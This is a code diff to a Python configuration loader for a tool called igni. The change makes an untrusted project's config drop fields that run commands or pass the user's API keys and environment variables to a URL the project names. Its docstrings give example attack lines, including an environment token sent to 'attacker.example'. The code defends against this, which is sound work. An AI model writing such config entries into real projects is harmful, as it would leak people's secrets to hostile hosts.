@@ -136,7 +136,98 @@ class ProjectYamlTier(YamlTier):
                 source=self._source.path,
                 why="a project may set only once you trust the folder (igni trust)",
             )
+            payload = self._without_key_sources(payload)
+            return self._without_borrowed_keys(accumulator, payload)
         return accumulator.merge(payload)
+
+    #: A model entry's fields that fetch or hold its key.
+    _KEY_FIELDS: tuple[str, ...] = ("api_key", "api_key_env", "api_key_cmd")
+    #: A model entry's fields that say where its requests go.
+    _ENDPOINT_FIELDS: tuple[str, ...] = ("url", "provider")
+
+    def _without_key_sources(self, payload: dict[str, Any]) -> dict[str, Any]:
+        """``payload`` less each model's ``api_key_cmd`` and ``api_key_env``, for an untrusted folder.
+
+        ``api_key_cmd`` is a program igni runs to fetch a key when it builds
+        the model. From a repository nobody has trusted yet it is the
+        repository's code, run by opening it: ``api_key_cmd: sh -c '…'`` in
+        a cloned ``.igni/config.yaml``. Found by the bandit lint (S603).
+
+        ``api_key_env`` runs nothing, but it reads any variable of the
+        person's environment and sends it, as the key, to the entry's
+        ``url`` — which the same file names: ``api_key_env: GITHUB_TOKEN``
+        and ``url: https://attacker.example/v1`` (B28). Both wait until the
+        folder is trusted. A literal ``api_key`` is the repository's own
+        string, nobody else's secret, so it stays.
+        """
+        models = payload.get("models")
+        if not isinstance(models, dict):
+            return payload
+        registry = models.get("registry")
+        if not isinstance(registry, dict):
+            return payload
+        dropped = ("api_key_cmd", "api_key_env")
+        refused = {
+            name: sorted(k for k in dropped if k in entry)
+            for name, entry in registry.items()
+            if isinstance(entry, dict) and any(k in entry for k in dropped)
+        }
+        if not refused:
+            return payload
+        logger.warning(
+            "%s sets %s; a project's api_key_cmd runs a program and its api_key_env "
+            "sends a variable of your environment to the URL it names, so they are "
+            "ignored until you trust the folder (igni trust).",
+            self._source.path,
+            ", ".join(f"{', '.join(keys)} for {name}" for name, keys in sorted(refused.items())),
+        )
+        cleaned = {
+            name: (
+                {k: v for k, v in entry.items() if k not in dropped} if name in refused else entry
+            )
+            for name, entry in registry.items()
+        }
+        return {**payload, "models": {**models, "registry": cleaned}}
+
+    def _without_borrowed_keys(
+        self, accumulator: SettingsAccumulator, payload: dict[str, Any]
+    ) -> SettingsAccumulator:
+        """Merge an untrusted ``payload``; a model it re-points keeps no key from below.
+
+        The merge is deep, so a project entry that sets only ``url`` for a
+        model the person's own config defines kept that config's
+        ``api_key`` (or ``api_key_env``, ``api_key_cmd``, ``cloud_token``)
+        and sent it to the project's host (B28). When an untrusted project
+        changes where a model's requests go, the entry's key comes from
+        the project or from nowhere.
+        """
+        merged = accumulator.merge(payload)
+        project_registry = (payload.get("models") or {}).get("registry")
+        below = (accumulator.payload.get("models") or {}).get("registry")
+        if not isinstance(project_registry, dict) or not isinstance(below, dict):
+            return merged
+        borrowed: list[str] = []
+        registry = dict(merged.payload["models"]["registry"])
+        for name, entry in project_registry.items():
+            lower = below.get(name)
+            if not (isinstance(entry, dict) and isinstance(lower, dict)):
+                continue
+            repointed = any(f in entry and entry[f] != lower.get(f) for f in self._ENDPOINT_FIELDS)
+            inherited = [k for k in self._KEY_FIELDS if k in lower and k not in entry]
+            if repointed and inherited:
+                borrowed.append(name)
+                registry[name] = {k: v for k, v in registry[name].items() if k not in inherited}
+        if not borrowed:
+            return merged
+        logger.warning(
+            "%s points %s at a different endpoint; the key your own config gives "
+            "%s is not sent there. Trust the folder (igni trust) to allow it.",
+            self._source.path,
+            ", ".join(sorted(borrowed)),
+            "it" if len(borrowed) == 1 else "them",
+        )
+        models = {**merged.payload["models"], "registry": registry}
+        return SettingsAccumulator(payload={**merged.payload, "models": models})
 
 
 def drop_project_keys(
